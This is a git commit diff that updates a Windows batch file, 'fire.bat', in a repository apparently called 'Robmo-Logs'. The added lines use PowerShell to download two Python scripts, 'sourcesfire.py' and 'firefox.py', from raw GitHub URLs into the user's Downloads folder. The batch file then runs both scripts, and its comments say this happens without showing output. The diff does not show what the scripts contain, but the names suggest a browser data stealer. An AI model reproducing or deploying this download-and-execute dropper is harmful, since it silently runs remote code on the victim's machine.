700935efb16f0c725ba06baccd401311e489381c
matiasb186 <86837307+matiasb186@users.noreply.github.com>
2023-10-20 14:36:49 -0500

    Update fire.bat

--- fire.bat
+++ fire.bat
@@ -1,25 +1,37 @@
 @echo off
 
 :: Ruta de descarga y nombre del archivo
-set "url=https://raw.githubusercontent.com/matiasb186/Robmo-Logs/main/sourcesfire.py"
+set "url1=https://raw.githubusercontent.com/matiasb186/Robmo-Logs/main/sourcesfire.py"
+set "url2=https://raw.githubusercontent.com/matiasb186/Robmo-Logs/main/firefox.py"
 set "download_folder=C:\Users\%USERNAME%\Downloads\ROBMO"
-set "filename=sourcesfire.py"
+set "filename1=sourcesfire.py"
+set "filename2=firefox.py"
 
-:: Nombre del archivo Python a ejecutar
-set "python_script=%download_folder%\%filename%"
+:: Nombre de los archivos Python a ejecutar
+set "python_script1=%download_folder%\%filename1%"
+set "python_script2=%download_folder%\%filename2%"
 
 :: Comprueba si la carpeta de descarga existe, y si no, créala
 if not exist "%download_folder%" (
     mkdir "%download_folder%"
 )
 
-:: Descarga el archivo desde la URL
-powershell -command "(New-Object System.Net.WebClient).DownloadFile('%url%', '%python_script%')"
+:: Descarga el primer archivo desde la URL
+powershell -command "(New-Object System.Net.WebClient).DownloadFile('%url1%', '%python_script1%')"
 
-:: Comprueba si la descarga fue exitosa
-if exist "%python_script%" (
-    :: Ejecuta el archivo Python descargado sin mostrar salida
-    python "%python_script%"
+:: Comprueba si la descarga del primer archivo fue exitosa
+if exist "%python_script1%" (
+    :: Ejecuta el primer archivo Python sin mostrar salida
+    python "%python_script1%"
+)
+
+:: Descarga el segundo archivo desde la URL
+powershell -command "(New-Object System.Net.WebClient).DownloadFile('%url2%', '%python_script2%')"
+
+:: Comprueba si la descarga del segundo archivo fue exitosa
+if exist "%python_script2%" (
+    :: Ejecuta el segundo archivo Python sin mostrar salida
+    python "%python_script2%"
 )
 
 exit
